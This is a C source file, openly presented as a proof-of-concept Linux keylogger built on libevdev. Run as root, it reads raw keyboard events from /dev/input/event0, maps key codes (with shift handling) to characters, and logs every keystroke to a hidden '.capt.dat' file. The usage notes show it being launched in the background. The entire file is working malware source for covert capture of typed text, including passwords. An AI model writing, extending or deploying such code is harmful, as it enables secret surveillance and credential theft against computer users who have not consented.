/* [keyc] : keycapture
 * Example of proof-of-concept Keylogger , key capture for Linux using libevdev
 * requires root.
 *
 * Requirements [libevdev]
 *  (debian-based) sudo apt-get install libevdev-dev
 * Include files obtained from repository : https://gitlab.freedesktop.org/libevdev/libevdev.git
 *  - gcc keyb.c -o keyb.c -levdev
 * Coded by v3l0r3k DECEMBER 2024
 * 
 * Usage (with root access):
 * - sudo ./keyh&
 * */

#include "include/libevdev.h"
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdbool.h>

#define KEY_SPACE 57
#define KEY_ENTER 28
#define KEY_LEFTSHIFT 42
#define KEY_RIGHTSHIFT 54
#define OUTPUT_FILE ".capt.dat" //file is hidden, saved in active dir
#define MAX_KEY 127
char ascii_map[MAX_KEY + 1] = {
    [2] = '1', [3] = '2', [4] = '3', [5] = '4', [6] = '5', [7] = '6', [8] = '7', [9] = '8', [10] = '9', [11] = '0',
    [12] = '-', [13] = '=', [16] = 'q', [17] = 'w', [18] = 'e', [19] = 'r', [20] = 't', [21] = 'y', [22] = 'u', [23] = 'i', [24] = 'o', [25] = 'p',
    [26] = '[', [27] = ']', [28] = '\n',  // Enter
    [30] = 'a', [31] = 's', [32] = 'd', [33] = 'f', [34] = 'g', [35] = 'h', [36] = 'j', [37] = 'k', [38] = 'l', [39] = ';', [40] = '\'',
    [41] = '`', [44] = 'z', [45] = 'x', [46] = 'c', [47] = 'v', [48] = 'b', [49] = 'n', [50] = 'm', [51] = ',', [52] = '.', [53] = '/',
    [57] = ' ', // Space
    // Add mappings for Shifted keys later (e.g., Shift+2 = '@')
};

// Shifted mapping: Uppercase letters and symbols
char shift_map[MAX_KEY + 1] = {
    [2] = '!', [3] = '@', [4] = '#', [5] = '$', [6] = '%', [7] = '^', [8] = '&', [9] = '*', [10] = '(', [11] = ')',
    [12] = '_', [13] = '+', [16] = 'Q', [17] = 'W', [18] = 'E', [19] = 'R', [20] = 'T', [21] = 'Y', [22] = 'U', [23] = 'I', [24] = 'O', [25] = 'P',
    [26] = '{', [27] = '}', [30] = 'A', [31] = 'S', [32] = 'D', [33] = 'F', [34] = 'G', [35] = 'H', [36] = 'J', [37] = 'K', [38] = 'L', [39] = ':',
    [40] = '"', [41] = '~', [44] = 'Z', [45] = 'X', [46] = 'C', [47] = 'V', [48] = 'B', [49] = 'N', [50] = 'M', [51] = '<', [52] = '>', [53] = '?',
};

_Bool shift = false;
int main() {
    char ascii=0;
    struct libevdev *dev = NULL;
    int rc=0, fd=0;
    FILE *output = NULL;
    fd = open("/dev/input/event0", O_RDONLY | O_NONBLOCK);
    if (fd < 0) {
        perror("Failed to open device. Make sure you have root access.");
        return 1;
    }

    rc = libevdev_new_from_fd(fd, &dev);
    if (rc < 0) {
        fprintf(stderr, "Failed to init libevdev.\n");
        return 1;
    }

    output = fopen(OUTPUT_FILE, "a");
    if (!output) {
        perror("Failed to open output file");
        libevdev_free(dev);
        close(fd);
        return 1;
    }


    while (1) {
        struct input_event ev;
        rc = libevdev_next_event(dev, LIBEVDEV_READ_FLAG_NORMAL, &ev);
        if (rc == 0 && ev.type == EV_KEY && ev.value >= 0) {
        if(ev.code == 42 || ev.code == 54) //shift keys
		  shift = true;
  	  if(ev.code == 42 && ev.value == 0) shift = false; 
	  if(ev.code == 54 && ev.value == 0) shift = false; 
	    
  	if (ev.code < MAX_KEY) {
		 if (!shift) ascii = ascii_map[ev.code];
 		   else ascii = shift_map[ev.code];
              if (ev.value ==1 ) {
                    fprintf(output, "%c", ascii);
		    fflush(output);
	    }
	    }
	}
    }
    libevdev_free(dev);
    close(fd);
    fclose(output);
    return 0;
}
